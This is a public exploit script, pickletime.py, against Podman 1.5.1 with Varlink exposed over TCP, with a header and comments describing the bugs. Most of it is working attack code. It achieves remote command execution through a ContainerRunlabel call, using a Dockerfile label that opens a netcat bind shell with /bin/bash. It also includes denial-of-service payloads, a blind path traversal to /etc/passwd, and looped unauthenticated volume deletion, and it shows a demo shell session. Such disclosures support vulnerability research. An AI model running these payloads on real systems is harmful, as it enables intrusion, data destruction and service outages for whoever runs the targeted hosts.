# Exploit Title: Podman & Varlink 1.5.1 - Remote Code Execution
# Exploit Author: Jeremy Brown
# Date: 2019-10-15
# Vendor Homepage: https://podman.io/
# Software Link: dnf install podman or https://github.com/containers/libpod/releases
# Version: 1.5.1
# Tested on: Fedora Server 30

#!/usr/bin/python
# -*- coding: UTF-8 -*-
#
# pickletime.py
#
# Podman + Varlink Insecure Config Remote Exploit
#
# -------
# Details
# -------
#
# Podman is container engine / platform similar to Docker supported
# by RedHat and Fedora with Varlink being a protocol to exchange
# messages, which comes in handy for things like a Remote API.
#
# Now depending on how Podman and Varlink are deployed, they can be
# susceptible to local and remote attacks. There are a few API bugs
# in Podman itself, as well as a way to execute arbitary commands if
# one can hit Podman via the Remote API. Running Podman with Varlink
# over tcp listening either on localhost or the network interface is the
# most vulnerable setup, but other ways such as access via the local UNIX
# socket or over SSH (key /w no passphrase is common) aren't likely
# to be vulnerable unless ACLs or other stuff is broken.
#
# ------------------
# Testing the issues
# ------------------
#
# - check; just connects and issues GetInfo() to see if the host is
#   running a podman service
#
# - exec; arbitrary cmd execution via ContainerRunlabel() specified
#   by "run" label in the specified hosted image (self-setup)
#
# - dos; crash the server via choosing a /random/ selection from
# 	the available parsing bugs in APIs (we like to have fun here)
#
# - blind; dir traversal in SearchImages() API to force server to
#   read an arbitrary file (no client-side output)
#
# - volrm; loops to remove all volumes via VolumeRemove() behavior
#
# ---------
# Exec demo
# ---------
#
# $ ./pickletime.py check podman-host:6000
# -> Podman service confirmed on host
#
# Then create a Dockerfile with an edgy label, build and host it.
#
# [Dockerfile]
# FROM busybox
# LABEL run=“nc -l -p 10000 -e /bin/bash”
#
# $ ./pickletime.py exec podman-host:6000 docker-registry:5000/image run
# Done!
#
# $ nc podman-host 10000
# ps                             
#    PID TTY          TIME CMD   
# 111640 pts/1    00:00:00 bash  
# 111786 pts/1    00:00:00 podman
# 111797 pts/1    00:00:00 nc    
# 111799 pts/1    00:00:00 bash  
# 111801 pts/1    00:00:00 ps    
#
#
# Tested Podman 1.4.4/1.5.1 and Varlink 18 on Fedora Server 30 x64
#
# -----------
# Other stuff
# -----------
#
# Note: admins can really setup their connection and deployment configuration
# however they like, so it's hard to say how many folks are 'doing it wrong'
# or actually are running with proper auth and hardening in place. Shodan
# folks have been contacted about adding support to discover Varlink services
# to get more data that way as well.
#
# Fixed bugs:
# - DoS #2 was fixed in 1.5.1
# - Updated security docs / cli flags TBD
#
# > Why pickles? Why not.
#
# Dependencies to run this code:
#
# sudo dnf install -y python3-podman-api
#
#
#

import os
import sys
import socket
import subprocess
import random
import json
import podman
import pickle
import time

serviceName = 'io.podman' # service name

def main():
	if(len(sys.argv) < 2):
		print("Usage: %s <action> <host> [action....params]\n" % sys.argv[0])
		print("Eg:    %s check tcp:podman-host:6000" % sys.argv[0])
		print("...    %s exec  tcp:podman-host:6000 docker-registry:5000/image run\n" % sys.argv[0])
		print("Actions: check, exec, dos, blind, volrm\n")
		return

	action = sys.argv[1]
	address = sys.argv[2] # eg. unix:/run/podman/io.podman for local testing

	ip = address.split(':')[1]
	port = int(address.split(':')[2])

	if(action == 'exec'):
		if(len(sys.argv) < 4):
			print("Error: need more args for exec")
			return

		image = sys.argv[3] # 'source' for pull
		label = sys.argv[4]

	isItTime()

	try:
		pman = podman.Client(uri=address)
	except Exception:
		print("Error: can't connect to host")
		return

	if(action == 'check'):
		result = json.dumps(pman.system.info())

		if('podman_version' in result):
			print("-> Podman service confirmed on host")
			return
		
		print("-!- Podman service was not found on host")

	
	elif(action == 'exec'):
		#
		# First pull the image from the repo, then run the label
		#
		try:
			result = pman.images.pull(image) # PullImage()
		except Exception as error:
			pass # call fails sometimes if image already exists which is *ok*

		#
		# ContainerRunlabel() ... but, no library imp. we'll do it live!
		#
		method = serviceName + '.' + 'ContainerRunlabel'

		message = '{\"method\":\"'
		message += method
		message += '\",\"parameters\":'
		message += '{\"Runlabel\":{\"image\":\"'
		message += image
		message += '\",\"label\":\"'
		message += label
		message += '\"}}}'
		message += '\0' # end each msg with a NULL byte

		doSocketSend(ip, port, message)


	elif(action == 'dos'):
		#bug = 1 # !fun
		bug = random.randint(1,2) # fun
		
		if(bug == 1):
			print("one")
			source = 'test'

			method = serviceName + '.' + 'LoadImage'

			message = '{\"method\":\"'
			message += method
			message += '\",\"parameters\":'
			message += '{\"source":\"'
			message += source
			message += '\"}}'
			message += '\0'

			doSocketSend(ip, port, message)


		# works on 1.4.4, fixed in 1.5.1
		if(bug == 2):
			print("two")

			reference = 'b' * 238
			source = '/dev/null' # this file must exist locally

			method = serviceName + '.' + 'ImportImage'

			message = '{\"method\":\"'
			message += method
			message += '\",\"parameters\":'
			message += '{\"reference\":\"'
			message += reference
			message += '\",\"source\":\"'
			message += source
			message += '\"}}'
			message += '\0'
			
			doSocketSend(ip, port, message)


	#
	# blind read of arbitrary files server-side
	# ...interesting but not particularly useful by itself
	#
	# openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 7
	# lseek(7, 0, SEEK_CUR)             = 0
	# fstat(7, {st_mode=S_IFREG|0644, st_size=1672, ...}) = 0
	# read(7, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1672
	# close(7)
	#
	elif(action == 'blind'):
		method = serviceName + '.' + 'SearchImages'
		query = '../../../etc/passwd/' # magic '/' at the end

		message = '{\"method\":\"'
		message += method
		message += '\",\"parameters\":'
		message += '{\"query\":\"'
		message += query
		message += '\"}}'
		message += '\0'

		#pman.images.search(query) # unclear why this doesn't work
		doSocketSend(ip, port, message)
	
	#
	# Not really a bug, but an interesting feature to demo without auth
	# note: call CreateVolume() a few times beforehand to test the removal
	#
	elif(action == 'volrm'):
		method = serviceName + '.' + 'VolumeRemove'
		n = 10 # this is probably enough to test, but change as necessary
		
		message = '{\"method\":\"'
		message += method
		message += '\",\"parameters\":'
		message += '{\"options\":{\"volumes\":[\"\"]}}}' # empty = alphabetical removal
		message += '\0'

		for _ in range(n):
			doSocketSend(ip, port, message)
			time.sleep(0.5) # server processing time

	print("Done!")


#
# podman/varlink libaries don't support calling these API calls, so native we must
#
def doSocketSend(ip, port, message):
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((ip, port))
		sock.send(message.encode())
		
	except Exception as error:
		print(str(error))
		return
		
	finally:
		sock.close()


#
# obligatory routine
#
def isItTime():
	tm = time.localtime()

	p = pickle.dumps('it\'s pickle time!')

	if((str(tm.tm_hour) == '11') and (str(tm.tm_min) == '11')):
		print(pickle.loads(p))
	else:
		pass # no dill


if(__name__ == '__main__'):
	main()